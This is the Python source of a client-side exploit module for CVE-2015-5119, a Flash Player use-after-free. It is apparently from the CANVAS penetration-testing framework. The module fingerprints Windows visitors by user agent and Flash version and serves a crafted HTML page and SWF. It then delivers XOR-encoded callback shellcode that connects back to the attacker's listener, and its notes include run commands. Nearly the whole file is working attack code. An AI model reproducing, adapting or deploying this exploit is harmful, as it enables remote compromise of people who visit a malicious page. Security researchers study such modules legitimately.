#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import zlib
import re

from shellcode import shellcodeGenerator

from Crypto.Cipher import XOR
from httpclientside import httpclientside
from libs.spkproxy import header, body
from libs.ua_parser import user_agent_parser
from shellcode.standalone.windows import payloads64

from exploitutils import *
from tcpexploit import *
import canvasengine


NAME                              = 'adobe_flash_valueof'
DESCRIPTION                       = 'Adobe Flash Player Use After Free (ValueOf)'
DOCUMENTATION                     = {}
DOCUMENTATION['VENDOR']           = 'Adobe'
DOCUMENTATION['References']       = ['http://blog.trendmicro.com/trendlabs-security-intelligence/unpatched-flash-player-flaws-more-pocs-found-in-hacking-team-leak/']

DOCUMENTATION['Repeatability']    = 'One-shot'
DOCUMENTATION['VersionsAffected'] = 'Adobe Flash Player > 9 and before 18.0.0.194 on Windows'
DOCUMENTATION['CVE Name']         = 'CVE-2015-5119'
DOCUMENTATION['CVE Url']          = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5119'
DOCUMENTATION['Notes']            = """

Tested on:
- Windows 7 x86/x64 IE(32/64) 8, 9, 11

This module exploits a use after free vulnerability on Adobe Flash Player.
When you have a ByteArray object ba, and perform an assignment like this ba[0] = object, it will call this object's ValueOf function
The ValueOf function can be overridden, so someone can change value of ba in the object ValueOf function
If you reallocate the ba memory in the ValueOf function, it will cause a UAF because ba[0] = object will save the original memory and use it after ValueOf function has been called.

IMPORTANT:

You need to setup a WIN64 MOSDEF INTEL listener in order for the callback
process to work, as the InjectToSelf shellcode doesn't support Universal MOSDEF
yet.

Usage:
python ./exploits/clientd/clientd.py -l 192.168.1.10 -d 5555 -O server_port:8080 -O allowed_attack_modules:adobe_flash_valueof -O auto_detect_exploits:0
python commandlineInterface.py -v 17 -p5555
"""

VERSION                           = '1.0'
PROPERTY                          = {}
PROPERTY['TYPE']                  = 'Exploit'
PROPERTY['SITE']                  = 'Clientside'
PROPERTY['ARCH']                  = [['Windows']]
PROPERTY['DELIVERY']              = 'HTTP'

CHANGELOG                         = """
"""


class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version         = 0
        self.name            = NAME
        self.filename        = "%s.html" % randomstring(8)
        self.swffilename     = 'fuaf'
        self.plugin_info     = None # we want clientd to give us a plugin dict
        self.refresh_rate    = 30
        self.xorer           = XOR.new("\x5a")
        self.badstring       = '\x00'

    def createShellcode(self, x64=False):
        if x64:
            p = payloads64.payloads()
            asm = p.InjectToSelf(self.callback.ip,
                             5555)
            bin = p.assemble(asm)
            self.shellcode = bin
            while len(self.shellcode) % 4 != 0:
                self.shellcode = "\x90" + self.shellcode

        else:
            self.shellcode = self.createWin32ClientSideShellcode(win8_compatible=False)

    def is_vulnerable(self, info_dict):
        parsed = user_agent_parser.Parse(info_dict['user_agent'])

        if not 'Windows' in parsed['os']['family']:
            self.log_error('Not a Windows host, aborting.')
            return 0

        # Adobe Flash Player before 18.0.0.194 and
        # after Adobe Flash Player 9 on Windows
        if "IE Flash" in info_dict['plugins']:
            flash          = info_dict['plugins']['IE Flash']
            version_regex = "([\d.]*\d+)"
            match         = re.search( version_regex, flash )

            # If there's no match it will throw an exception
            if match:
                flash_version  = match.group(0)
            else:
                return 0

            version_list = flash_version.split(".")

            major = int(version_list[0])
            minor = int(version_list[1])
            build = int(version_list[2])
            patch = int(version_list[3])

            if major > 9 and major < 18:
                return 1
            if major == 18:
                if minor == 0:
                    if build == 0:
                        if patch <= 194:
                            return 1
        return 0

    def makefile(self):
        """
        Makes the exploit HTML
        """
        self.getArgs()

        filedata="""        <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
        <html lang="en">
            <head>
                <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
                <title>Blank Page</title>
            </head>
            <body>
                <object classid="clsid:233C1507-6A77-46A4-9443-F871F945D258" width=600 height=430 VIEWASTEXT>
                    <param name="allowScriptAccess" value="sameDomain" />
                    <param name="allowFullScreen" value="false" />
                    <param name="movie" value="SWFFILENAME.swf" /><param name="quality" value="high" /><param name="bgcolor" value="#ffffff" />
                    <embed src="SWFFILENAME.swf" quality="high" bgcolor="#ffffff" width="550" height="400" name="SWFFILENAME"
                    align="middle" allowScriptAccess="sameDomain" allowFullScreen="false" type="application/x-shockwave-flash"
                    pluginspage="http://www.macromedia.com/go/getflashplayer" />
                </object>
            </body>
        </html>"""

        filedata = filedata.replace('SWFFILENAME', self.swffilename)
        filedata = filedata.replace('        ','')
        return filedata

    def makeSWF(self):
        with open(os.path.join(os.path.dirname(__file__), 'Resources', self.swffilename + '.swf'), 'rb') as f:
            return f.read()

    def makesploit(self, clientheader, clientbody):
        h = header('SERVER')
        b = body()

        # if there is no info about plugins, at least we can filter using
        # the user-agent making sure target is Windows
        useragent = clientheader.getStrValue(['User-Agent'])
        if "windows" in useragent.lower():
            self.log_info("This client is likely to be vulnerable")
            if 'win64' in useragent.lower():
                self.createShellcode(True)
            else:
                self.createShellcode(False)
        else:
            self.log_error("Bailing on this client as it is not likely to be vulnerable")
            return None, None

        if clientheader.URL.count(self.filename):
            self.log_info('Serving HTML file')
            sploitstring = self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Content-Type', 'text/html')

        elif clientheader.URL.count(self.swffilename):
            self.log_info('Serving SWF file')
            b.setBody(self.makeSWF())
            h.addHeader('Content-Type', 'application/x-shockwave-flash')

        elif clientheader.URL.count("code"):
            h.addHeader('Content-Type', 'application/octet-stream')
            b.setBody(self.xorer.encrypt(zlib.compress(self.shellcode)))

        else:
            self.log_info('Redirecting to self')
            h.status = '302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type', 'text/html')

        return h, b

    def getArgs(self):
        self.host=self.target.interface
        self.getarg("filename")

    def run(self):
        self.getArgs()

        # Build the html that triggers the vulnerability
        filedata = self.makefile()
        self.log_info('Opening %s for output' % self.filename)
        fd=file(self.filename, 'wb+')
        fd.write(filedata)
        fd.close()
        self.log_info('Wrote exploit HTML to %s' % self.filename)

        return 1


if __name__ == '__main__':
    print 'Running CANVAS %s Exploit v %s' % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

    if ret not in [0, 1, None]:
        ret.interact()
